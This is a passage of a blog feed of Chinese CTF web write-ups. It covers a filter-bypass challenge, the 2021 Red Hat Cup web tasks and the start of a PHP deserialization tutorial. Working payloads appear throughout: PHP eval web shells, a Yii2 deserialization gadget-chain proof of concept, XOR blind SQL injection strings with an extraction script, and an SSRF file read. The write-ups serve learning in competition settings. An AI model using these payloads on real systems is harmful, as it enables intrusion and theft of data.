variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>preg_match()</code>过滤了<code>eval</code>但是！！！！！</p><p><code>Eval</code>它没ban</p><p>所以我们可以写’大’马</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php%20@Eval($_POST['aaa']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连马</p><p>拿到flag：</p><p><img src="https://i.loli.net/2021/05/12/D89pgxfsbSlhZTz.png"></p><p>但是作为菜鸡</p><p>我还是要重新思考一下这道题的思路：</p><p>代码中有几个函数需要注意一下</p><p>比如<code>fopen()</code>,<code>fwrite()</code>,<code>fread()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 函数读取文件<span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也就是说，这里已经读到了flag</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这里又都写到了hack<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以也就是说，我们再绕通配符写马的时候，flag也被传进了hack.php中</p><p>但是为什么看不到呢（具体我也不知道，知道的大哥哥可以告诉我学习一下）</p><p>但是我想到了另外一个函数<code>show_source()</code></p><pre class="line-numbers language-none"><code class="language-none">show_source() 函数对文件进行语法高亮显示。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随机构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php show_source(__FILE__);?&gt;也没有被ban的项，正常传入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后访问<code>hack.php</code></p><p>flag他就出来了。。。。</p><p>同时还有我传入的payload</p><p><img src="https://i.loli.net/2021/05/12/rFVdyT7eBqtgnxb.png"></p><p>搞一波骚操作！</p><p><img src="https://i.loli.net/2021/05/12/Z3TzmtK8y4U6ehj.png"></p><p>所以，今天又学到了新姿势~~~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="做题记录" scheme="https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>2021红帽杯 web writeup</title>
    <link href="https://h3h3qaq.github.io/posts/fa671b36.html"/>
    <id>https://h3h3qaq.github.io/posts/fa671b36.html</id>
    <published>2021-11-11T03:35:22.000Z</published>
    <updated>2021-11-11T02:44:27.496Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h1><p>老套路扫一下目录</p><p><img src="https://i.loli.net/2021/05/09/4EKaizG6qguQYn1.png"></p><p>貌似只有君子协定有用，打开看看</p><pre class="line-numbers language-none"><code class="language-none">When I was a child,I also like to read Robots.txtHere is what you want:1ndexx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>打开1ndexx.php 发现打不开，</p><p><img src="https://i.loli.net/2021/05/09/nTgAyYj2vQON4Fr.png"></p><p>尝试一下是否有备份</p><pre class="line-numbers language-none"><code class="language-none">/.1ndexx.php.swp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现了一串代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'localhost'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Hello worldd!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span> <span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">padding</span><span class="token punctuation">:</span> 50px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Open Sans"</span><span class="token punctuation">,</span><span class="token string">"Helvetica Neue"</span><span class="token punctuation">,</span>Helvetica<span class="token punctuation">,</span>Arial<span class="token punctuation">,</span>sans-serif<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">#logo</span> <span class="token punctuation">{</span><span class="token property">margin-bottom</span><span class="token punctuation">:</span> 40px<span class="token punctuation">;</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo.png<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hello My freind!"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>I Can't view my php files?!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>MySQL Server version: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">mysql_get_server_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?code=&lt;?php%20phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问一下hack.php查看phpinfo</p><p>本来只是想指向探针看一下，没想到flag直接给了</p><p><img src="https://i.loli.net/2021/05/09/ny7PlqVYvoRCZUI.png"></p><h1 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h1><p>打开发现是<code>yii2反序列化</code></p><p>随即打开百度，来找一下复现：</p><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40">https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40</a></p></blockquote><p>然后回到题目，按照常理我扫了一下网站目录，发现了<code>www.zip</code>“ ：</p><p><img src="https://i.loli.net/2021/05/09/AWP7rC6RewKDsky.png"></p><p>下载到本地发现正好是源码，就在本地搭建环境</p><p>丢进去phpstudy里，按照大佬的漏洞复现，在controllers下创建<code>Controller.php</code></p><p><img src="https://i.loli.net/2021/05/09/MVcW7PqKdzaOIw4.png"></p><p>然后再新建个<code>poc.php</code></p><p>在里面写：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">id</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'file_put_contents("/var/www/html/web/1.php","&lt;?php eval(\$_POST[111]);");'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span><span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再生成一下payload</p><p><img src="https://i.loli.net/2021/05/09/kvEFMTuwgG4oCAq.png"></p><p>传进去：</p><pre class="line-numbers language-none"><code class="language-none">/index.php?r=site/about&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一开始，传进去看到这个报错，以为没有成功，后来访问了一下<code>1.php</code>发现自己成功了QAQ</p><p>打开蚁剑，直接连上马：</p><p><img src="https://i.loli.net/2021/05/09/TkjAf9phLMnFi7c.png"></p><p>看了一圈发现flag再根目录：</p><p><img src="https://i.loli.net/2021/05/09/iakWRl7KEbXpqyM.png"></p><p>然后发现没有权限。。。。。。。又卡住了</p><p>但是我做题晚上刚刚复现了蓝帽的web题，有disable_functions绕过插件，就去试了一下</p><p><img src="https://i.loli.net/2021/05/09/q4bgalyCrJsDXfL.png"></p><p>然后试着读了一下</p><p><img src="https://i.loli.net/2021/05/09/CkhtdG4QfKrmH12.png"></p><p>它就出来了！！！！！！！</p><p>#WebsiteManger</p><p>是一道注入题</p><p>跑了一下sqlmap</p><p>发现了两个参数：</p><p><code>username</code> <code>password</code> </p><p><img src="https://i.loli.net/2021/05/09/FjZvebwfxyqk4Ya.png"></p><p>和<code>/image.php</code>下的id</p><p>注入了一下发现前两个都不是，随即对<code>id</code>下手</p><p>尝试了几种注入都无效，最后发现是异或注入</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有回现，尝试变更参数</p><p>直到：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>时没有回显，证明数据库第一位是c</p><p>获取第二位：</p><pre class="line-numbers language-none"><code class="language-none">/image.php?id=1^(ascii(substr((select(database())),2,1))&gt;1)^1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现到<code>117</code>没有回显</p><p>证明第二位为t</p><p>依次类推，获得第三位为f</p><p>当数据库位数为4位时始终没有回显。证明只有三位，且数据库名为<code>ctf</code></p><p>知道了数据库名就好办了，直接起脚本，依次爆）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))&gt;{1})^1"</span> word<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token number">32</span>    h <span class="token operator">=</span> <span class="token number">128</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> h<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;</span> h<span class="token punctuation">)</span><span class="token punctuation">:</span>        nurl<span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>nurl<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'JFIF'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            l <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            h <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> h<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    word <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得表名为 users</p><p>之后依次修改url 继续 爆破</p><p>最终爆破出来密码为（当前环境下的密码）：</p><p><img src="https://i.loli.net/2021/05/09/6vMxa7mzsWNVbnF.png"></p><p>然后登录管理员账号：</p><p><img src="https://i.loli.net/2021/05/09/5g3tBZMlqIDdbcJ.png"></p><p>抓包查看发现是ssrf 读取文件漏洞</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">file:// /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得flag</p><p><img src="https://i.loli.net/2021/05/09/GasAxph3ugTE4fF.png"></p><p>#hpcurve</p><p>是一道原题</p><p>原题地址：<a href="https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/">https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>ebcdic编码转换成ascii编码</p><p>使用DD命令去操作，Linux命令</p><p>得到flag</p><p><img src="https://i.loli.net/2021/05/09/VLBli9zf854HcDh.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="做题记录" scheme="https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞基础</title>
    <link href="https://h3h3qaq.github.io/posts/ae3250a1.html"/>
    <id>https://h3h3qaq.github.io/posts/ae3250a1.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-11T02:31:30.274Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP序列化与序列化"><a href="#PHP序列化与序列化" class="headerlink" title="PHP序列化与序列化"></a>PHP序列化与序列化</h1><p>作者：H3h3QAQ</p><h2 id="一、PHP序列化和反序列化"><a href="#一、PHP序列化和反序列化" class="headerlink" title="一、PHP序列化和反序列化"></a>一、PHP序列化和反序列化</h2><h3 id="1-PHP反序列化："><a href="#1-PHP反序列化：" class="headerlink" title="1.PHP反序列化："></a>1.PHP反序列化：</h3><p><code>serialize()</code></p><p>将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构</p><p>常见的序列化字母表示及其含义：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a <span class="token operator">-</span> <span class="token keyword">array</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>key <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>value <span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>key n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>value n<span class="token operator">&gt;</span><span class="token punctuation">}</span>b <span class="token operator">-</span> boolean  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">b</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>digit<span class="token operator">&gt;</span>d <span class="token operator">-</span> double   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">d</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>i <span class="token operator">-</span> integer  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">i</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>o <span class="token operator">-</span> common r <span class="token operator">-</span> references <span class="token operator">-</span> string   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">s</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"&lt;value&gt;"</span><span class="token constant">C</span> <span class="token operator">-</span> custom object<span class="token constant">O</span> <span class="token operator">-</span> <span class="token keyword">class</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">O</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span 